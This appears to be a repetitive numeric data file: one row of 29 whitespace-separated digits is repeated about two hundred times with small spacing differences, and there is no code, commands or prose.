   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5  0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1   9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1  9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
